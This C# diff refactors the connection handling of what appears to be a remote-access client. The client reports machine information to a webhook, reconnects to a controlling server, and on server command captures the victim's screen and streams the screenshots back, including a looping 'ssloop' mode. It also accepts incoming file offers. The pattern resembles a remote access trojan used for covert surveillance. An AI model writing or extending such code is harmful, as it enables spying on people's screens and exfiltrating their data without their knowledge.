@@ -94,25 +94,32 @@ namespace Client
                 string webhookUrl = (string)config["webhook"];
                 _ = GClass.SendWebhookNotificationAsync(webhookUrl, clientInfo);
             }
+            await ClientManager.StartAsync();
 
-            var client = new LazyServerClient();
-            await GClass.ReconnectLoop(client);
+            var client = ClientManager.GetClient();
 
-            client.Disconnected += async (s, e) =>
+
+            ClientManager.ClientDisconnected += async () =>
             {
-                if (!isGracefulDisconnect)
-                {
-                    await GClass.ReconnectLoop(client);
-                    var screenshot = GClass.CaptureScreen(Screen.AllScreens[monitoridx]);
-                    await client.SendFileBytes(screenshot, clientInfo.ToString());
+                Console.WriteLine($"we disconnectin");
+                while (!ClientManager.GetClient().IsConnected) {
+                    Console.WriteLine($"waiting for client to reconnect...");
+                    await Task.Delay(100);
                 }
+                await Task.Delay(500);
+                SetupHandlers(ClientManager.GetClient());
             };
 
-            var screenshot = GClass.CaptureScreen(Screen.AllScreens[monitoridx]);
+            
+            /*await client.SendFileBytes(screenshot, clientInfo.ToString());
             await client.SendFileBytes(screenshot, clientInfo.ToString());
-            await client.SendFileBytes(screenshot, clientInfo.ToString());
+            */
             GClass.StartHeartbeat(client);
+            SetupHandlers(client);
+        }
 
+        private static async void SetupHandlers(LazyServerClient client) {
+            var screenshot = GClass.CaptureScreen(Screen.AllScreens[monitoridx]);
             // Replace your current FileOfferWithMetaReceived event handler with this:
             client.FileOfferWithMetaReceived += (s, e) => {
                 try
@@ -175,6 +182,7 @@ namespace Client
 
             client.MessageReceived += async (s, e) =>
             {
+                Console.WriteLine($"Received message: {e.Message}");
                 try
                 {
                     JObject message = JObject.Parse(e.Message);
@@ -183,6 +191,7 @@ namespace Client
                     switch (command)
                     {
                         case "ssloop":
+                            Console.WriteLine("Starting screenshot loop...");
                             if (!screenshotLoopRunning)
                                 await StartScreenshotLoopAsync(client, message);
                             break;
